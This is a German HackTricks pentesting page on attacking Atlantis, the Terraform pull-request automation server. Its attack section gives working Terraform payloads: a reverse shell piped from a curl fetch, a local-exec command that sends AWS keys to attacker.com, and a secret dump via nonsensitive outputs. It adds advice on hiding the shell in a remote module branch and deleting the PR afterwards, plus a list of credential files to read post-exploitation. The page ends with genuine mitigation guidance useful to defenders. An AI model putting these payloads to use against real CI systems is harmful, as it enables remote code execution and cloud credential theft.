# Atlantis Security

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

### Grundinformationen

Atlantis hilft dir im Grunde, Terraform von Pull Requests von deinem Git-Server auszuf√ºhren.

![](<../.gitbook/assets/image (161).png>)

### Lokales Labor

1. Gehe zur **Atlantis-Release-Seite** in [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) und **lade** die passende Version herunter.
2. Erstelle ein **pers√∂nliches Token** (mit Repo-Zugriff) deines **GitHub**-Benutzers.
3. F√ºhre `./atlantis testdrive` aus, und es wird ein **Demo-Repo** erstellt, das du verwenden kannst, um mit Atlantis zu **kommunizieren**.
4. Du kannst die Webseite unter 127.0.0.1:4141 aufrufen.

### Atlantis-Zugriff

#### Git-Server-Anmeldeinformationen

**Atlantis** unterst√ºtzt mehrere Git-Hosts wie **GitHub**, **GitLab**, **Bitbucket** und **Azure DevOps**.\
Um jedoch auf die Repos auf diesen Plattformen zuzugreifen und Aktionen durchzuf√ºhren, muss ihm **privilegierter Zugriff gew√§hrt werden** (mindestens Schreibberechtigungen).\
[**Die Dokumentation**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional) empfiehlt, einen Benutzer auf diesen Plattformen speziell f√ºr Atlantis zu erstellen, aber einige Leute verwenden m√∂glicherweise pers√∂nliche Konten.

{% hint style="warning" %}
Aus der Sicht eines Angreifers wird das **Atlantis-Konto** sehr **interessant** sein, **kompromittiert** zu werden.
{% endhint %}

#### Webhooks

Atlantis verwendet optional [**Webhook-Geheimnisse**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret), um zu validieren, dass die **Webhooks**, die es von deinem Git-Host erh√§lt, **legitim** sind.

Eine M√∂glichkeit, dies zu best√§tigen, w√§re, **Anfragen nur von den IPs** deines Git-Hosts zuzulassen, aber ein einfacherer Weg ist die Verwendung eines Webhook-Geheimnisses.

Beachte, dass du, es sei denn, du verwendest einen privaten GitHub- oder Bitbucket-Server, Webhook-Endpunkte ins Internet exponieren musst.

{% hint style="warning" %}
Atlantis wird **Webhooks exponieren**, damit der Git-Server ihm Informationen senden kann. Aus der Sicht eines Angreifers w√§re es interessant zu wissen, **ob du ihm Nachrichten senden kannst**.
{% endhint %}

#### Anbieter-Anmeldeinformationen <a href="#provider-credentials" id="provider-credentials"></a>

[Aus der Dokumentation:](https://www.runatlantis.io/docs/provider-credentials.html)

Atlantis f√ºhrt Terraform aus, indem es einfach die **Befehle `terraform plan` und `apply`** auf dem Server **ausf√ºhrt, auf dem Atlantis gehostet wird**. Genau wie bei der lokalen Ausf√ºhrung von Terraform ben√∂tigt Atlantis Anmeldeinformationen f√ºr deinen spezifischen Anbieter.

Es liegt an dir, wie du [Anmeldeinformationen](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info) f√ºr deinen spezifischen Anbieter an Atlantis bereitstellst:

* Das Atlantis [Helm-Chart](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) und das [AWS Fargate-Modul](https://www.runatlantis.io/docs/deployment.html#aws-fargate) haben ihre eigenen Mechanismen f√ºr Anbieter-Anmeldeinformationen. Lies ihre Dokumentation.
* Wenn du Atlantis in einer Cloud betreibst, haben viele Clouds M√∂glichkeiten, Anwendungen, die auf ihnen laufen, API-Zugriff zu gew√§hren, z.B.:
* [AWS EC2-Rollen](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (Suche nach "EC2-Rolle")
* [GCE-Instanzdienstkonten](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider_reference)
* Viele Benutzer setzen Umgebungsvariablen, z.B. `AWS_ACCESS_KEY`, wo Atlantis l√§uft.
* Andere erstellen die erforderlichen Konfigurationsdateien, z.B. `~/.aws/credentials`, wo Atlantis l√§uft.
* Verwende den [HashiCorp Vault Provider](https://registry.terraform.io/providers/hashicorp/vault/latest/docs), um Anbieter-Anmeldeinformationen zu erhalten.

{% hint style="warning" %}
Der **Container**, in dem **Atlantis** **l√§uft**, wird h√∂chstwahrscheinlich **privilegierte Anmeldeinformationen** f√ºr die Anbieter (AWS, GCP, GitHub...) enthalten, die Atlantis √ºber Terraform verwaltet.
{% endhint %}

#### Webseite

Standardm√§√üig wird Atlantis eine **Webseite auf Port 4141 auf localhost** ausf√ºhren. Diese Seite erm√∂glicht es dir lediglich, Atlantis anzuwenden/deaktivieren und den Planstatus der Repos zu √ºberpr√ºfen und sie zu entsperren (sie erlaubt keine √Ñnderungen, daher ist sie nicht sehr n√ºtzlich).

Du wirst sie wahrscheinlich nicht im Internet exponiert finden, aber es scheint, dass standardm√§√üig **keine Anmeldeinformationen erforderlich sind**, um darauf zuzugreifen (und wenn doch, sind `atlantis`:`atlantis` die **Standard**-Anmeldeinformationen).

### Serverkonfiguration

Die Konfiguration f√ºr `atlantis server` kann √ºber Befehlszeilenflags, Umgebungsvariablen, eine Konfigurationsdatei oder eine Mischung aus dreien angegeben werden.

* Du kannst die [**Liste der unterst√ºtzten Flags**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration) f√ºr den Atlantis-Server hier finden.
* Du kannst [**hier erfahren, wie man eine Konfigurationsoption in eine Umgebungsvariable umwandelt**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables).

Werte werden **in dieser Reihenfolge ausgew√§hlt**:

1. Flags
2. Umgebungsvariablen
3. Konfigurationsdatei

{% hint style="warning" %}
Beachte, dass du in der Konfiguration interessante Werte wie **Tokens und Passw√∂rter** finden k√∂nntest.
{% endhint %}

#### Repo-Konfiguration

Einige Konfigurationen beeinflussen, **wie die Repos verwaltet werden**. Es ist jedoch m√∂glich, dass **jedes Repo unterschiedliche Einstellungen ben√∂tigt**, sodass es M√∂glichkeiten gibt, jede Repo zu spezifizieren. Dies ist die Priorit√§tsreihenfolge:

1. Repo [**`/atlantis.yml`**](https://www.runatlantis.io/docs/repo-level-atlantis-yaml.html#repo-level-atlantis-yaml-config) Datei. Diese Datei kann verwendet werden, um anzugeben, wie Atlantis das Repo behandeln soll. Standardm√§√üig k√∂nnen jedoch einige Schl√ºssel hier ohne bestimmte Flags nicht angegeben werden.
2. Wahrscheinlich erforderlich, um durch Flags wie `allowed_overrides` oder `allow_custom_workflows` erlaubt zu werden.
3. [**Serverseitige Konfiguration**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config): Du kannst sie mit dem Flag `--repo-config` √ºbergeben, und es ist eine YAML, die neue Einstellungen f√ºr jedes Repo konfiguriert (Regex wird unterst√ºtzt).
4. **Standard**-Werte.

**PR-Schutz**

Atlantis erlaubt anzugeben, ob du m√∂chtest, dass der **PR** von jemand anderem **`genehmigt`** wird (auch wenn das nicht im Branch-Schutz festgelegt ist) und/oder **`zusammenf√ºhrbar`** (Branch-Schutz bestanden) **ist, bevor `apply` ausgef√ºhrt wird**. Aus sicherheitstechnischer Sicht ist es ratsam, beide Optionen festzulegen.

Falls `allowed_overrides` wahr ist, k√∂nnen diese Einstellungen **in jedem Projekt durch die `/atlantis.yml`-Datei √ºberschrieben werden**.

**Skripte**

Die Repo-Konfiguration kann **Skripte** angeben, die [**vor**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage) (_Pre-Workflow-Hooks_) und [**nach**](https://www.runatlantis.io/docs/post-workflow-hooks.html) (_Post-Workflow-Hooks_) einem **Workflow ausgef√ºhrt werden**.

Es gibt keine Option, um **diese Skripte** in der **Repo `/atlantis.yml`**-Datei anzugeben.

**Workflow**

In der Repo-Konfiguration (serverseitige Konfiguration) kannst du [**einen neuen Standard-Workflow angeben**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow) oder [**neue benutzerdefinierte Workflows erstellen**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**.** Du kannst auch **angeben**, welche **Repos** auf die **neuen** generierten zugreifen k√∂nnen.\
Dann kannst du die **atlantis.yaml**-Datei jedes Repos erlauben, den zu verwendenden Workflow **anzugeben**.

{% hint style="danger" %}
Wenn das [**serverseitige Konfigurations**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) Flag `allow_custom_workflows` auf **True** gesetzt ist, k√∂nnen Workflows in der **`atlantis.yaml`**-Datei jedes Repos **spezifiziert** werden. Es k√∂nnte auch erforderlich sein, dass **`allowed_overrides`** auch **`workflow`** angibt, um den Workflow zu **√ºberschreiben**, der verwendet werden soll.\
Dies w√ºrde im Grunde **RCE im Atlantis-Server f√ºr jeden Benutzer, der auf dieses Repo zugreifen kann, erm√∂glichen**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

**Conftest Richtlinienpr√ºfung**

Atlantis unterst√ºtzt das Ausf√ºhren von **serverseitigen** [**conftest**](https://www.conftest.dev/) **Richtlinien** gegen die Plan-Ausgabe. H√§ufige Anwendungsf√§lle f√ºr diesen Schritt sind:

* Verweigerung der Nutzung einer Liste von Modulen
* √úberpr√ºfung von Attributen einer Ressource zum Zeitpunkt der Erstellung
* Auffangen unbeabsichtigter Ressourcenl√∂schungen
* Verhinderung von Sicherheitsrisiken (d.h. das Offenlegen sicherer Ports f√ºr die √ñffentlichkeit)

Sie k√∂nnen √ºberpr√ºfen, wie Sie es konfigurieren k√∂nnen, in [**den Dokumenten**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works).

### Atlantis Befehle

[**In den Dokumenten**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis) finden Sie die Optionen, die Sie verwenden k√∂nnen, um Atlantis auszuf√ºhren:
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
### Angriffe

{% hint style="warning" %}
Wenn Sie w√§hrend der Ausnutzung diesen **Fehler** finden: `Error: Error acquiring the state lock`

K√∂nnen Sie ihn beheben, indem Sie Folgendes ausf√ºhren:
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

#### Atlantis plan RCE - Konfigurations√§nderung in neuem PR

Wenn Sie Schreibzugriff auf ein Repository haben, k√∂nnen Sie einen neuen Branch erstellen und einen PR generieren. Wenn Sie **`atlantis plan` ausf√ºhren k√∂nnen** (oder es m√∂glicherweise automatisch ausgef√ºhrt wird), **werden Sie in der Lage sein, RCE innerhalb des Atlantis-Servers durchzuf√ºhren**.

Sie k√∂nnen dies tun, indem Sie [**Atlantis eine externe Datenquelle laden lassen**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data_source). F√ºgen Sie einfach eine Payload wie die folgende in die `main.tf`-Datei ein:
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**Stealthier Angriff**

You can perform this attack even in a **stealthier way**, by following this suggestions:

* Anstatt die rev shell direkt in die terraform-Datei einzuf√ºgen, k√∂nnen Sie **eine externe Ressource laden**, die die rev shell enth√§lt:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Sie k√∂nnen den rev shell Code in [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules) finden.

* Verwenden Sie im externen Ressourcen die **ref**-Funktion, um den **terraform rev shell Code in einem Branch** innerhalb des Repos zu verbergen, etwas wie: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* **Stattdessen** von einem **PR zu master** zu erstellen, um Atlantis auszul√∂sen, **erstellen Sie 2 Branches** (test1 und test2) und erstellen Sie einen **PR von einem zum anderen**. Wenn Sie den Angriff abgeschlossen haben, **entfernen Sie einfach den PR und die Branches**.

#### Atlantis Plan Secrets Dump

Sie k√∂nnen **Secrets, die von terraform verwendet werden**, dumpen, indem Sie `atlantis plan` (`terraform plan`) ausf√ºhren und etwas wie dies in die Terraform-Datei einf√ºgen:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
#### Atlantis apply RCE - Konfigurations√§nderung in neuem PR

Wenn Sie Schreibzugriff auf ein Repository haben, k√∂nnen Sie einen neuen Branch erstellen und einen PR generieren. Wenn Sie **`atlantis apply` ausf√ºhren k√∂nnen, werden Sie in der Lage sein, RCE innerhalb des Atlantis-Servers zu erreichen**.

Sie m√ºssen jedoch normalerweise einige Schutzma√ünahmen umgehen:

* **Mergeable**: Wenn dieser Schutz in Atlantis aktiviert ist, k√∂nnen Sie **`atlantis apply` nur ausf√ºhren, wenn der PR mergeable ist** (was bedeutet, dass der Branch-Schutz umgangen werden muss).
* √úberpr√ºfen Sie m√∂gliche [**Umgehungen von Branch-Schutzma√ünahmen**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)
* **Genehmigt**: Wenn dieser Schutz in Atlantis aktiviert ist, muss **ein anderer Benutzer den PR genehmigen**, bevor Sie `atlantis apply` ausf√ºhren k√∂nnen.
* Standardm√§√üig k√∂nnen Sie das [**Gitbot-Token missbrauchen, um diesen Schutz zu umgehen**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)

Ausf√ºhren von **`terraform apply` auf einer b√∂sartigen Terraform-Datei mit** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Sie m√ºssen nur sicherstellen, dass eine Payload wie die folgenden im `main.tf`-Datei endet:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Folgen Sie den **Vorschl√§gen aus der vorherigen Technik**, um diesen Angriff auf eine **diskretere Weise** durchzuf√ºhren.

#### Terraform Param Injection

Wenn `atlantis plan` oder `atlantis apply` ausgef√ºhrt wird, wird Terraform untergeordnet ausgef√ºhrt. Sie k√∂nnen Befehle an Terraform von Atlantis √ºber Kommentare √ºbergeben, indem Sie etwas wie Folgendes schreiben:
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
Etwas, das Sie √ºbergeben k√∂nnen, sind Umgebungsvariablen, die hilfreich sein k√∂nnten, um einige Schutzma√ünahmen zu umgehen. √úberpr√ºfen Sie die Terraform-Umgebungsvariablen in [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables)

#### Benutzerdefinierter Workflow

Ausf√ºhren von **b√∂sartigen benutzerdefinierten Build-Befehlen**, die in einer `atlantis.yaml`-Datei angegeben sind. Atlantis verwendet die `atlantis.yaml`-Datei aus dem Pull-Request-Zweig, **nicht** von `master`.\
Diese M√∂glichkeit wurde in einem vorherigen Abschnitt erw√§hnt:

{% hint style="danger" %}
Wenn das [**serverseitige Konfigurations**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) Flag `allow_custom_workflows` auf **True** gesetzt ist, k√∂nnen Workflows in der **`atlantis.yaml`**-Datei jedes Repos **spezifiziert** werden. Es ist auch potenziell erforderlich, dass **`allowed_overrides`** auch **`workflow`** angibt, um den **Workflow zu √ºberschreiben**, der verwendet werden soll.

Dies gibt im Grunde **RCE im Atlantis-Server f√ºr jeden Benutzer, der auf dieses Repo zugreifen kann**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### Umgehung von Plan-/Anwendungs-Schutzma√ünahmen

Wenn das [**Server-seitige Konfigurations**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) Flag `allowed_overrides` _die_ `apply_requirements` konfiguriert hat, ist es m√∂glich, dass ein Repo die **Plan-/Anwendungs-Schutzma√ünahmen √§ndert, um sie zu umgehen**.
```yaml
repos:
- id: /.*/
apply_requirements: []
```
#### PR Hijacking

Wenn jemand **`atlantis plan/apply` Kommentare zu Ihren g√ºltigen Pull-Requests sendet,** wird Terraform ausgef√ºhrt, wenn Sie es nicht m√∂chten.

Dar√ºber hinaus, wenn Sie nicht in den **Branch-Schutz** konfiguriert haben, um bei jedem **neuen Commit** zu verlangen, dass jeder PR **neu bewertet** wird, k√∂nnte jemand **b√∂sartige Konfigurationen** (siehe vorherige Szenarien) in der Terraform-Konfiguration schreiben, `atlantis plan/apply` ausf√ºhren und RCE erlangen.

Dies ist die **Einstellung** in den Github-Branch-Schutz:

![](<../.gitbook/assets/image (216).png>)

#### Webhook Secret

Wenn es Ihnen gelingt, das **Webhook-Secret** zu **stehlen** oder wenn **kein Webhook-Secret** verwendet wird, k√∂nnten Sie **den Atlantis-WebHook aufrufen** und **Atlantis-Befehle** direkt ausf√ºhren.

#### Bitbucket

Bitbucket Cloud unterst√ºtzt **keine Webhook-Secrets**. Dies k√∂nnte Angreifern erm√∂glichen, **Anfragen von Bitbucket zu f√§lschen**. Stellen Sie sicher, dass Sie nur Bitbucket-IP-Adressen zulassen.

* Das bedeutet, dass ein **Angreifer** **falsche Anfragen an Atlantis** stellen k√∂nnte, die so aussehen, als k√§men sie von Bitbucket.
* Wenn Sie `--repo-allowlist` angeben, k√∂nnten sie nur Anfragen zu diesen Repos f√§lschen, sodass der gr√∂√üte Schaden, den sie anrichten k√∂nnten, darin bestehen w√ºrde, auf Ihren eigenen Repos zu planen/anwenden.
* Um dies zu verhindern, erlauben Sie nur [Bitbucket-IP-Adressen](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html) (siehe ausgehende IPv4-Adressen).

### Post-Exploitation

Wenn Sie Zugriff auf den Server erhalten haben oder zumindest einen LFI haben, gibt es einige interessante Dinge, die Sie versuchen sollten zu lesen:

* `/home/atlantis/.git-credentials` Enth√§lt VCS-Zugangsdaten
* `/atlantis-data/atlantis.db` Enth√§lt VCS-Zugangsdaten mit weiteren Informationen
* `/atlantis-data/repos/<org_name>`_`/`_`<repo_name>/<pr_num>/<workspace>/<path_to_dir>/.terraform/terraform.tfstate` Terraform-Zustandsdatei
* Beispiel: /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` Umgebungsvariablen
* `/proc/[2-20]/cmdline` Cmd-Zeile von `atlantis server` (kann sensible Daten enthalten)

### Mitigations

#### Don't Use On Public Repos <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

Da jeder auf √∂ffentlichen Pull-Requests kommentieren kann, ist es selbst mit allen verf√ºgbaren Sicherheitsma√ünahmen immer noch gef√§hrlich, Atlantis auf √∂ffentlichen Repos ohne ordnungsgem√§√üe Konfiguration der Sicherheitseinstellungen auszuf√ºhren.

#### Don't Use `--allow-fork-prs` <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

Wenn Sie auf einem √∂ffentlichen Repo (was nicht empfohlen wird, siehe oben) arbeiten, sollten Sie `--allow-fork-prs` nicht setzen (Standard ist false), da jeder einen Pull-Request von seinem Fork zu Ihrem Repo √∂ffnen kann.

#### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

Atlantis erfordert, dass Sie eine Allowlist von Repositories angeben, von denen es Webhooks √ºber das Flag `--repo-allowlist` akzeptiert. Zum Beispiel:

* Bestimmte Repositories: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* Ihre gesamte Organisation: `--repo-allowlist=github.com/runatlantis/*`
* Jedes Repository in Ihrer GitHub Enterprise-Installation: `--repo-allowlist=github.yourcompany.com/*`
* Alle Repositories: `--repo-allowlist=*`. N√ºtzlich, wenn Sie sich in einem gesch√ºtzten Netzwerk befinden, aber gef√§hrlich, ohne auch ein Webhook-Secret festzulegen.

Dieses Flag stellt sicher, dass Ihre Atlantis-Installation nicht mit Repositories verwendet wird, die Sie nicht kontrollieren. Siehe `atlantis server --help` f√ºr weitere Details.

#### Protect Terraform Planning <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

Wenn Angreifer Pull-Requests mit b√∂sartigem Terraform-Code in Ihrem Bedrohungsmodell einreichen, m√ºssen Sie sich bewusst sein, dass Genehmigungen f√ºr `terraform apply` nicht ausreichen. Es ist m√∂glich, b√∂sartigen Code in einem `terraform plan` auszuf√ºhren, indem die [`external` Datenquelle](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data_source) verwendet oder ein b√∂sartiger Anbieter angegeben wird. Dieser Code k√∂nnte dann Ihre Anmeldeinformationen exfiltrieren.

Um dies zu verhindern, k√∂nnten Sie:

1. Anbieter in das Atlantis-Image einbacken oder hosten und den Ausgang im Produktionsumfeld verweigern.
2. Das Anbieter-Registry-Protokoll intern implementieren und √∂ffentlichen Ausgang verweigern, sodass Sie kontrollieren, wer Schreibzugriff auf die Registry hat.
3. Ihren [serverseitigen Repo-Konfigurations](https://www.runatlantis.io/docs/server-side-repo-config.html) `plan`-Schritt √§ndern, um gegen die Verwendung von nicht erlaubten Anbietern oder Datenquellen oder PRs von nicht erlaubten Benutzern zu validieren. Sie k√∂nnten auch an diesem Punkt zus√§tzliche Validierungen hinzuf√ºgen, z.B. ein "Daumen hoch" auf dem PR verlangen, bevor Sie den `plan` fortsetzen lassen. Conftest k√∂nnte hier n√ºtzlich sein.

#### Webhook Secrets <a href="#webhook-secrets" id="webhook-secrets"></a>

Atlantis sollte mit Webhook-Secrets ausgef√ºhrt werden, die √ºber die Umgebungsvariablen `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET` festgelegt sind. Selbst mit dem gesetzten Flag `--repo-allowlist` k√∂nnten Angreifer Anfragen an Atlantis stellen, die sich als ein Repository ausgeben, das auf der Allowlist steht. Webhook-Secrets stellen sicher, dass die Webhook-Anfragen tats√§chlich von Ihrem VCS-Anbieter (GitHub oder GitLab) stammen.

Wenn Sie Azure DevOps verwenden, f√ºgen Sie anstelle von Webhook-Secrets einen grundlegenden Benutzernamen und ein Passwort hinzu.

#### Azure DevOps Basic Authentication <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOps unterst√ºtzt das Senden eines grundlegenden Authentifizierungs-Headers in allen Webhook-Ereignissen. Dies erfordert die Verwendung einer HTTPS-URL f√ºr Ihren Webhook-Standort.

#### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

Wenn Sie Webhook-Secrets verwenden, aber Ihr Datenverkehr √ºber HTTP l√§uft, k√∂nnten die Webhook-Secrets gestohlen werden. Aktivieren Sie SSL/HTTPS mit den Flags `--ssl-cert-file` und `--ssl-key-file`.

#### Enable Authentication on Atlantis Web Server <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

Es wird dringend empfohlen, die Authentifizierung im Webdienst zu aktivieren. Aktivieren Sie BasicAuth mit `--web-basic-auth=true` und richten Sie einen Benutzernamen und ein Passwort mit den Flags `--web-username=yourUsername` und `--web-password=yourPassword` ein.

Sie k√∂nnen diese auch als Umgebungsvariablen √ºbergeben: `ATLANTIS_WEB_BASIC_AUTH=true`, `ATLANTIS_WEB_USERNAME=yourUsername` und `ATLANTIS_WEB_PASSWORD=yourPassword`.

### References

* [**https://www.runatlantis.io/docs**](https://www.runatlantis.io/docs)
* [**https://www.runatlantis.io/docs/provider-credentials.html**](https://www.runatlantis.io/docs/provider-credentials.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichen.

</details>
{% endhint %}
